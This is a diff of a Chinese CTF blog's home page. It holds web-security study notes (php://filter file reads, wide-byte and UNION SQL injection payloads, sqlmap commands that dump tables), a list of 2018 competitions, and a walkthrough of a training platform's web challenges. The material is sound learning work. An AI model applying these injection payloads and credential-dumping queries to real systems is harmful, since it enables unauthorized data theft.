@@ -123,7 +123,7 @@
 
 
 
-  <title>归档 | BoBo's Blog</title>
+  <title>BoBo's Blog</title>
   
 
 
@@ -142,7 +142,8 @@
     
   
 
-  <div class="container sidebar-position-left page-archive">
+  <div class="container sidebar-position-left 
+  page-home">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -235,411 +236,1770 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
+  <section id="posts" class="posts-expand">
+    
+      
+
+  
 
   
   
   
-  <div class="post-block archive">
-    <div id="posts" class="posts-collapse">
-      <span class="archive-move-on"></span>
 
-      <span class="archive-page-counter">
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/07/ctf-web/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="BoBo">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BoBo's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
         
         
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/10/07/ctf-web/" itemprop="url">ctf-web</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-07T21:15:13+08:00">
+                2018-10-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
         
           
-        
-        嗯..! 目前共计 24 篇日志。 继续努力。
-      </span>
+            <p>看了dalao的博客，总结一下知识点<br>include漏洞<br>遇到php代码中有include($file)的，一般和 php://input或者php://filter有关，$file值如果是php://input，就要用post表单构造数据，如果是php://filter，就用下面的payload读取文件base64加密后的源代码，解密后查看源代码。<br><code>php://filter/read=convert.base64-encoding/resource=文件名(如index.php)</code><br>代码审计<br>如md5函数结果相等（0ed+）的比较，以及strcmp(array,string)=null<br>MD5黑魔法：240610708和QNKCDZO这两个字符MD5值是相当的<br>php中<code>+  _  .</code>可以替换<br>弱类型可以传入数组比较大小<br>解码<br>JS的几种编码（如JSFUCK）都可以在浏览器F12之后的控制台执行，这样可以省去找解密网站的时间<br>html编码，base64编码，url编码等等都可以在burpsuite上的decoder栏解决，但是发现burpsuite有一点不好就是中文不能显示，不知道是不是字符编码没有配置好，找到一个网址：<br><a href="https://emn178.github.io/online-tools/base64_decode.html" target="_blank" rel="noopener">https://emn178.github.io/online-tools/base64_decode.html</a><br>可以解好几种<br>sql<br>布尔注入，盲注之类的意思，布尔注入就像一个只会告诉你对或错的机器人，然后你去问他问题从而解决问题，盲注是说不会有提示信息，虽然对数据库的操作依然存在，但是不论是否操作成功都不会告诉你。 对一个注入语句记个笔记：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%df&apos; union select 1,database() %23</span><br><span class="line">%df&apos; union select 1,string from sql5.key %23</span><br></pre></td></tr></table></figure><br><code>%df</code>是在编码为gbk的时候用于宽字节注入的<br><code>%23</code>就是#，但是用#不能通过；还有可以直接用 <code>union select 字段名 from 数据库名.表名</code>获取字段的值。<br>sqlmap<br>对用sqlmap进行手工注入的一些步骤记个笔记<br>首先找到可以注入的点，比如找到网页的某个动态页面是可以注入用来显示信息的，然后将这个url用sqlmap来暴库爆表。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;url&quot; --level 3 --batch --dbs</span><br><span class="line">python sqlmap.py -u &quot;url&quot; --level 3 --batch -D ctf --tables</span><br><span class="line">python sqlmap.py -u &quot;url&quot; --level 3 --batch -D ctf -T flag --columns --dump</span><br></pre></td></tr></table></figure><br>–batch sqlmap不会询问你输入 全部默认确定<br> –level 3 指定等级，大于等于3的时候会涉及到http头注入的Referer字段<br> –（两个-）符号用于查询，比如–dbs用于查询所有的数据库，–tables用于查询所有的表，-（一个-）符号用于指定，比如-D ctf用于指定查询的是ctf数据库，-T flag用于指定查询的是flag表，–dump可以用来将表中字段的值显示出来。<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@@version()    MYSQL版本</span><br><span class="line">@@database()   当前数据库</span><br><span class="line">@@user()       当前用户</span><br><span class="line">@@datadir      当前数据库路径</span><br><span class="line">@@version_compile_os  操作系统版本</span><br><span class="line"></span><br><span class="line">concat(str1,str2,...)                没有分隔符地连接字符串</span><br><span class="line">2. concat_ws(separator,str1,str2,...)   用分隔符连接字符串</span><br><span class="line">3. group_concat(str1,str2,...)          用逗号分隔字符串</span><br></pre></td></tr></table></figure><br>一些payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">查数据库名，用户名</span><br><span class="line">union select 1,2,concat(user(),database(),version()),4,……,N -- </span><br><span class="line">（最后--用于注释掉后面sql语句避免出错） 得到数据库名</span><br><span class="line">2. 查表名：</span><br><span class="line">union select group_concat(0x0a,table_name),2 from information_schema.tables where table_schema=库名十六进制#</span><br><span class="line">（库名十六进制可以用database()代替）</span><br><span class="line">3. 查列名</span><br><span class="line">union select group_concat(0x0a,column_name),2 from information_schema.columns where table_schema=database() and table_name=’users’#</span><br><span class="line">（也可以把表名改为十六进制编码0x7573657273）</span><br><span class="line">4. 查需要的信息（用户名和密码）</span><br><span class="line">union select group_concat(distinct 0x0a,user_id,0x0a,first_name,0x0a,last_name,0x0a,user,0x0a,password,0x0a),2 from users #</span><br></pre></td></tr></table></figure></p>
 
-      
-
-        
-        
-        
-
-        
           
-          <div class="collection-title">
-            <h1 class="archive-year" id="archive-year-2018">2018</h1>
-          </div>
         
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/10/07/ctf-web/" itemprop="url">
-              
-                <span itemprop="name">ctf-web</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-10-07T21:15:13+08:00"
-              content="2018-10-07" >
-          10-07
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
       
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/09/30/比赛/" itemprop="url">
-              
-                <span itemprop="name">近期比赛（按比赛时间及报名截止顺序）</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-09-30T13:32:57+08:00"
-              content="2018-09-30" >
-          09-30
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/09/29/1/" itemprop="url">
-              
-                <span itemprop="name">中国矿业大学BXS实训平台WEB部分解析</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-09-29T10:00:02+08:00"
-              content="2018-09-29" >
-          09-29
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/04/30/Redhat/" itemprop="url">
-              
-                <span itemprop="name">Redhat2018 WP</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-04-30T11:19:14+08:00"
-              content="2018-04-30" >
-          04-30
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/04/26/youku/" itemprop="url">
-              
-                <span itemprop="name">怎么在优酷下载视频不用VIP，不用客户端</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-04-26T16:55:53+08:00"
-              content="2018-04-26" >
-          04-26
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/04/21/DDCTF2108-misc/" itemprop="url">
-              
-                <span itemprop="name">DDCTF2108 misc</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-04-21T10:49:12+08:00"
-              content="2018-04-21" >
-          04-21
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/04/13/密码杂项/" itemprop="url">
-              
-                <span itemprop="name">常见密码杂项题目</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-04-13T11:42:40+08:00"
-              content="2018-04-13" >
-          04-13
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/03/29/solvetime/" itemprop="url">
-              
-                <span itemprop="name"><font color="#dd0000"><font size="7">solveme解析</font><br /></font><br /></span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-03-29T19:18:54+08:00"
-              content="2018-03-29" >
-          03-29
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/03/28/ganhuo/" itemprop="url">
-              
-                <span itemprop="name">一大批干货</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-03-28T09:27:18+08:00"
-              content="2018-03-28" >
-          03-28
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/03/24/XSS/" itemprop="url">
-              
-                <span itemprop="name">XSS常见口令</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-03-24T23:01:03+08:00"
-              content="2018-03-24" >
-          03-24
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
     </div>
+    
+    
+    
+
+    
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
   </div>
   
   
   
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/30/比赛/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="BoBo">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BoBo's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/09/30/比赛/" itemprop="url">近期比赛（按比赛时间及报名截止顺序）</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-30T13:32:57+08:00">
+                2018-09-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>一、领航杯（4人）<br><a href="http://jyxxhd.jse.edu.cn/Competition/Newsnetwork/about/channelid/a5dada0d74c547d28f6a8f999afcd249" target="_blank" rel="noopener">http://jyxxhd.jse.edu.cn/Competition/Newsnetwork/about/channelid/a5dada0d74c547d28f6a8f999afcd249</a><br><code>2018.10.8~2018.10.9</code>（不过貌似延迟了）</p>
+<p>二、“护网杯”首届工业互联网安全大赛（5人）<br><a href="http://www.huwangbei.cn/" target="_blank" rel="noopener">http://www.huwangbei.cn/</a><br>“护网杯”2018年网络安全防护赛暨首届工业互联网安全大赛，报名火热进行中。<br>目前已有来自于中央企业、基础电信企业、互联网企业、工业互联网企业、高校等千余支队伍报名参赛，报名时间将于10月10日截止。<br>报名时间：8月18日一10月10日<br>线上预选赛：<code>10.13</code><br>所有参赛人员须拥有唯一中国国籍(不合港澳台地区)，每支赛队成员不超过5人。<br>现场决赛：线上预选赛排名前60的战队可申请参加决赛，赛队人员应由同一企业、高校、事业单位人员组成，于10月19日前向赛事组委会提交加盖单位公章的报名表和个人身份证明。经组委会审核通过后，按照预赛排名取40支战队参赛。</p>
+<p>三、上海大学生网络安全大赛（3人）</p>
+<p>#报名截止时间：2018 年 10 月 28 日。 </p>
+<p>##1、网络攻防赛预赛<br>时间为<code>11月3日08:00至11月4日8:00。</code>预赛为CTF在线解<br>题比赛，采取网络答题方式进行，各高校参赛队登录大赛官网<br>（<a href="http://www.ichunqiu.com/shwas）具体开放日期另行通知" target="_blank" rel="noopener">http://www.ichunqiu.com/shwas）具体开放日期另行通知</a><br>点击预赛链接，使用网络报名时注册的帐号密码登录预赛网址进行网络预<br>赛。网络攻防赛根据预赛成绩由高至低产生28支决赛队伍，其中上<br>海高校13支队伍，外省市15支队伍（注：外省市高校每校最多只允<br>许一支出线队伍参加决赛），详细名单将于11月11日前在公众号、<br>官方QQ群等公布</p>
+<p>四、2018湖湘杯（3人）<br><a href="http://hxb.hunan.gov.cn/mobile/message" target="_blank" rel="noopener">http://hxb.hunan.gov.cn/mobile/message</a><br>   （一）海选队线上报名<br>　　定于2018年10月1日12时至11月8日24时<br>开放网络安全技能大赛比赛报名通道，符合参赛资格者凭大赛平台发出的短信或电子邮件通知参赛；</p>
+<p>　　（二）海选队初赛<br>    <code>11月10日09:00至11日09:00</code><br>　　公布参加复赛资格名单：初赛结束后一周内在大赛官网公布，并以短信或电子邮件通知符合资格者参加复赛。</p>
+<p>　　（二）海选队复赛<br>　　复赛时间：2018年11月18日10时至18日22时。<br>　　公布参加决赛资格名单：网络安全技能大赛复赛结束后一周在大赛官网公布网络安全技能大赛决赛名单。并以短信、电子邮件或者电话通知符合资格者赴长沙参加现场比赛。</p>
+<p>　　（三）海选队和邀请队共同决赛<br>　　决赛分两场进行：<br>　　2018年11月26日举行第一场，上半场：08:00-12:30、下半场：14:00-19:00。期间12时30分至14时统一组织安排午餐，暂停比赛。<br>　　2018年11月27日举行第二场：08:00-13:00。</p>
+<p>加油！<br><img src="/2018/09/30/比赛/hacker.jpg" alt=" "></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/29/1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="BoBo">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BoBo's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/09/29/1/" itemprop="url">中国矿业大学BXS实训平台WEB部分解析</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-29T10:00:02+08:00">
+                2018-09-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>这个平台首先需要做出基础选择题才能做挑战的CTF题，好久没有写博客了，此处手动感谢Overwatch大佬帮我修好了博客<br>首先我们看题</p>
+<h2 id="一、源代码"><a href="#一、源代码" class="headerlink" title="一、源代码"></a>一、源代码</h2><p><img src="/2018/09/29/1/源代码题目1.jpg" alt=" "><br>题目提示源代码，我们打开题目链接<br><img src="/2018/09/29/1/源代码题目2.jpg" alt=" "><br>看到BXS的Logo，由于题目提示源代码，所以我们点击鼠标右键查看源代码、如图：<br><img src="/2018/09/29/1/源代码.jpg" alt=" "><br>flag就在最下面<br><code>flag{youfindme23333333333}</code></p>
+<h2 id="二、colorSnake"><a href="#二、colorSnake" class="headerlink" title="二、colorSnake"></a>二、colorSnake</h2><p><img src="/2018/09/29/1/color1.jpg" alt=" "><br>打开以后发现是个游戏，但是如果你真的想玩到50分，那就是你真的想多了hiahiahia~<br>我们还是先看一下网页源代码（这里我直接审查元素了ctrl+F12即可）如图：<br><img src="/2018/09/29/1/color2.jpg" alt=" "><br>我们看到关键的源码：<code>game.js</code><br>打开来看一下game.js具体内容，定位到关键函数<code>var game</code><br><img src="/2018/09/29/1/color3.jpg" alt=" "><br><img src="/2018/09/29/1/color4.jpg" alt=" "><br>具体来看一下这个说了点啥<br>可以看到要是访问到<code>getScore.php</code>分数就会增加，所以我们可以自己写一个访问这个链接的脚本（如果和我一样的编程菜鸡，不如试试手动不停访问，速度不能太快，不然会被判作弊）<br>看一下我们的对比图<br><img src="/2018/09/29/1/color5.jpg" alt=" "><br><img src="/2018/09/29/1/color6.jpg" alt=" "><br>可以看到分数是有改变的，一直到50就可以出flag了<br>另一种思路就是可以在控制台直接提交JS计时器，让他不停的访问<code>game.js</code><br>姿势如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">setInterval(function()&#123;xhr(&apos;./getScore.php&apos;,function(e)&#123;</span><br><span class="line">               var r = JSON.parse(e);</span><br><span class="line">               if(r.state == 200)</span><br><span class="line">                   game.addScore(r.score);</span><br><span class="line">               else&#123;</span><br><span class="line">                   alert(r.msg);</span><br><span class="line">                   game.start()</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;)&#125;,1000)</span><br></pre></td></tr></table></figure><br>直接控制台提交坐等flag<br><img src="/2018/09/29/1/color7.jpg" alt=" "><br><code>flag{y0u_a4e_A_che4T_b0y}</code></p>
+<h2 id="三、备份"><a href="#三、备份" class="headerlink" title="三、备份"></a>三、备份</h2><p><img src="/2018/09/29/1/备份1.jpg" alt=" "><br>题目提示说和备份有关<br><img src="/2018/09/29/1/备份2.jpg" alt=" "><br>我们点开网页查看源代码发现有1.bak和2.bak 在好奇心的驱使下，为什么不试试3.bak呢？<br>当尝试完我们发现1、2、3这三个都可以下载下来（当然里面内容没卵用23333）<br>况且源码提示了：There are too much baks in the website<br>可以写个脚本跑一下试试，说不定flag在后面某一个bak文件中<br>这里附上八一大佬的脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">##coding:utf-8</span><br><span class="line">   import requests</span><br><span class="line">   def traverse():</span><br><span class="line">       for i in range(0,1000):</span><br><span class="line">           t = requests.get(&apos;http://bxs.cumt.edu.cn/challenge/web/code/&apos;+str(i)+&apos;.bak&apos;)</span><br><span class="line">           if i%50 == 0:</span><br><span class="line">               print (i)</span><br><span class="line">           if &apos;flag&apos; in t.text:</span><br><span class="line">               print(t.text)</span><br><span class="line">           else :</span><br><span class="line">               continue</span><br><span class="line">   try:</span><br><span class="line">       traverse()</span><br><span class="line">   finally:</span><br><span class="line">       traverse()</span><br></pre></td></tr></table></figure><br>最后我们发现998.bak就是flag文件<br><code>flag{s0_s0_e@sy}</code></p>
+<h2 id="四、自动获取flag"><a href="#四、自动获取flag" class="headerlink" title="四、自动获取flag"></a>四、自动获取flag</h2><p><img src="/2018/09/29/1/自动获取1.jpg" alt=" "><br>由题目可见，说了要改一下js代码，于是我们打开网页源代码查看<br><img src="/2018/09/29/1/自动获取2.jpg" alt=" "><br>我们先看一下js代码，看到里面有个param1.php<br><code>http://bxs.cumt.edu.cn/challenge/web/ctf0001/param1.php</code><br>我们访问看一下，可以看到<br><code>{&quot;param&quot;:&quot;%5B%221%22%2C%226%22%2C%222%22%2C%228%22%2C%224%22%2C%222%22%2C%228%22%2C%224%22%2C%229%22%2C%221%22%2C%2210%22%5D&quot;}</code><br>这是url编码，解码的到数组：<code>[&quot;1&quot;,&quot;6&quot;,&quot;2&quot;,&quot;8&quot;,&quot;4&quot;,&quot;2&quot;,&quot;8&quot;,&quot;4&quot;,&quot;9&quot;,&quot;1&quot;,&quot;10&quot;]</code><br>这param1应该是个求和函数（要是错了，欢迎各位大佬指导）<br>因为我们看到源码里第二个url应该是写错了的，所以改一下<br>第二个url对照第一个改为：param2.php?param=’+sum,但是程序中直接得到的参数是编码的，所以在程序中加上解码语句<code>d.param=unescape(d.param)</code><br>在控制台执行我们改完的代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">function calParam2(d)&#123;</span><br><span class="line">    d.param=unescape(d.param);</span><br><span class="line">    var data=JSON.parse((d.param));</span><br><span class="line">    var length=data.length;</span><br><span class="line">    var second=new Date().getSeconds();</span><br><span class="line">    var sum=0;</span><br><span class="line">    for (var i = 1; i &lt; length; i++) &#123;</span><br><span class="line">        for (var j = 0; j &lt; length/2; j++) &#123;</span><br><span class="line">            sum+=parseInt(data[i])*second + data[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 请求flag</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url:&apos;param2.php?param=&apos;+sum,</span><br><span class="line">        method:&apos;get&apos;,</span><br><span class="line">        dataType:&apos;json&apos;,</span><br><span class="line">        success:function(s)&#123;</span><br><span class="line">            alert(s.f);</span><br><span class="line"></span><br><span class="line">        &#125;,</span><br><span class="line">        error:function(s)&#123;</span><br><span class="line">            alert(&apos;错了&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">   </span><br></pre></td></tr></table></figure></p>
+<p>最后贴上flag<br><code>flag{hello,This is A Gift FoRm PHP&amp;JS; O(∩_∩)O~}</code></p>
+<h2 id="五、cookie？"><a href="#五、cookie？" class="headerlink" title="五、cookie？"></a>五、cookie？</h2><p><img src="/2018/09/29/1/cooike1.jpg" alt=" "><br>既然说了纯属娱乐送分，就不要想太难了~<br>进去以后会提示：请以管理员身份登陆<br>于是我们打开Burp进行抓包<br>了解burp怎么使用请<a href="https://blog.csdn.net/gitchat/article/details/79168613" target="_blank" rel="noopener">点击这里</a><br>这是们抓的包<br><img src="/2018/09/29/1/cooike2.jpg" alt=" "><br>可以看到<code>Cookie: user=guest;</code><br>题目说的必须管理员身份打开，所以修改为<code>Cookie: user=admin;</code>重新发包即可。<br>会得到这个东西<br><img src="/2018/09/29/1/cooike3.jpg" alt=" "><br>图片下载下来<br><img src="/2018/09/29/1/cooike4.jpg" alt=" "><br>丢进百度识图知道这个人叫维吉尼亚，但是维吉尼亚密码不是他发明的，只是命名而已。<br>然后找到在线解维吉尼亚的网站，推荐<code>www.ctftools.com</code><br>输入图片下面的字符串，可以看到图片上面有提示：<code>key：e</code><br>所以密钥我们输入：e<br>如下图<br><img src="/2018/09/29/1/cooike5.jpg" alt=" "><br>点击解密即可得到flag<br>flag<code>thisisanoldencrypt</code></p>
+<h2 id="六、phpmywind"><a href="#六、phpmywind" class="headerlink" title="六、phpmywind"></a>六、phpmywind</h2><p>本来应该比较难的一道题目，但是配置有点问题，直接报出flag<br><img src="/2018/09/29/1/php1.jpg" alt=" "><br><code>flag{327A6C4304AD5938EAF0EFB6CC3E53DC}</code></p>
+<h2 id="七、is-hash-safe"><a href="#七、is-hash-safe" class="headerlink" title="七、is hash safe??"></a>七、is hash safe??</h2><p><img src="/2018/09/29/1/hash.jpg" alt=" "><br>打开提示只有admin可以登录，抓包修改guest为admin无果,看到后面还有一串hsh=<br>看到题目说有东西没有删干净，于是找一下<code>admin.php.swp</code>(常见的备份文件)<br><img src="/2018/09/29/1/hash1.jpg" alt=" "><br>可以下载下来一个，<code>admin.php.swp</code>文件<br>不知道swp文件是什么的可以<a href="https://blog.csdn.net/weixin_38133867/article/details/78671626" target="_blank" rel="noopener">点击这里</a><br>使用<code>Vim</code>恢复<code>vim -r index.php.swp</code><br><img src="/2018/09/29/1/hash3.jpg" alt=" "><br>看到代码立有<code>cumtctf{you_know_this_is_not_the_flag}</code>假的flag<br>因为前面说到有hsh=……<br>所以来试试哈希长度扩展攻击</p>
